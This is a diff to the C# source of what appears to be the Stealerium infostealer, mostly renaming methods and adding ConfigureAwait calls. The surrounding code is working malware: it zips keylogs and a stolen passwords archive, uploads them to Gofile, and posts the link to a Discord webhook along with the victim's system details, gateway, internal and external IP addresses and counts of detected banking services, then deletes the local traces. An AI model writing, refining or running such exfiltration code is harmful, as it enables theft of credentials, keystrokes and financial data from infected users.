@@ -22,7 +22,7 @@ namespace Stealerium
         private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");
 
         // Save latest message id to file
-        public static void SetLatestMessageId(string id)
+        private static void SetLatestMessageId(string id)
         {
             try
             {
@@ -37,7 +37,7 @@ namespace Stealerium
         }
 
         // Get latest message id from file
-        public static string GetLatestMessageId()
+        private static string GetLatestMessageId()
         {
             return File.Exists(LatestMessageIdLocation) ? File.ReadAllText(LatestMessageIdLocation) : "-1";
         }
@@ -49,13 +49,13 @@ namespace Stealerium
             return id;
         }
 
-        public static async Task<bool> WebhookIsValid()
+        public static async Task<bool> WebhookIsValidAsync()
         {
             try
             {
                 using (var client = new HttpClient())
                 {
-                    var response = await client.GetStringAsync(Config.Webhook);
+                    var response = await client.GetStringAsync(Config.Webhook).ConfigureAwait(false);
                     return response.StartsWith("{\"type\": 1");
                 }
             }
@@ -71,7 +71,7 @@ namespace Stealerium
         ///     Send message to discord channel
         /// </summary>
         /// <param name="text">Message text</param>
-        public static async Task<string> SendMessage(string text)
+        private static async Task<string> SendMessageAsync(string text)
         {
             try
             {
@@ -85,8 +85,8 @@ namespace Stealerium
                 using (var client = new HttpClient())
                 {
                     var content = new FormUrlEncodedContent(discordValues);
-                    var response = await client.PostAsync(Config.Webhook + "?wait=true", content);
-                    var responseString = await response.Content.ReadAsStringAsync();
+                    var response = await client.PostAsync(Config.Webhook + "?wait=true", content).ConfigureAwait(false);
+                    var responseString = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                     return GetMessageId(responseString);
                 }
             }
@@ -103,7 +103,7 @@ namespace Stealerium
         /// </summary>
         /// <param name="text">New text</param>
         /// <param name="id">Message ID</param>
-        public static async Task EditMessage(string text, string id)
+        private static async Task EditMessageAsync(string text, string id)
         {
             try
             {
@@ -121,7 +121,7 @@ namespace Stealerium
                     {
                         Content = content
                     };
-                    await client.SendAsync(request);
+                    await client.SendAsync(request).ConfigureAwait(false);
                 }
             }
             catch
@@ -141,7 +141,7 @@ namespace Stealerium
             var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
             var archive = Filemanager.CreateArchive(log, false);
             File.Move(archive, filename + ".zip");
-            var url = GofileFileService.UploadFile(filename + ".zip");
+            var url = GofileFileService.UploadFileAsync(filename + ".zip");
             File.Delete(filename + ".zip");
             File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                                $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
@@ -168,7 +168,7 @@ namespace Stealerium
         ///     Format system information for sending to telegram bot
         /// </summary>
         /// <returns>String with formatted system information</returns>
-        private static async Task SendSystemInfo(string url)
+        private static async Task SendSystemInfoAsync(string url)
         {
             UploadKeylogs();
 
@@ -193,7 +193,7 @@ namespace Stealerium
                        + "\n📡 *Network:* "
                        + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                        + "\nInternal IP: " + SystemInfo.GetLocalIp()
-                       + "\nExternal IP: " + SystemInfo.GetPublicIp().Result
+                       + "\nExternal IP: " + SystemInfo.GetPublicIpAsync().Result
                        + "\n"
                        + "\n💸 *Domains info:*"
                        + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
@@ -256,17 +256,17 @@ namespace Stealerium
 
             var last = GetLatestMessageId();
             if (last != "-1")
-                await EditMessage(info, last);
+                await EditMessageAsync(info, last).ConfigureAwait(false);
             else
-                SetLatestMessageId(await SendMessage(info));
+                SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));
         }
 
-        public static async Task SendReport(string file)
+        public static async Task SendReportAsync(string file)
         {
             Logging.Log("Sending passwords archive to Gofile");
-            var url = GofileFileService.UploadFile(file);
+            var url = GofileFileService.UploadFileAsync(file);
             Logging.Log("Sending report to discord");
-            await SendSystemInfo(await url);
+            await SendSystemInfoAsync(await url.ConfigureAwait(false)).ConfigureAwait(false);
             Logging.Log("Report sent to discord");
             File.Delete(file);
         }
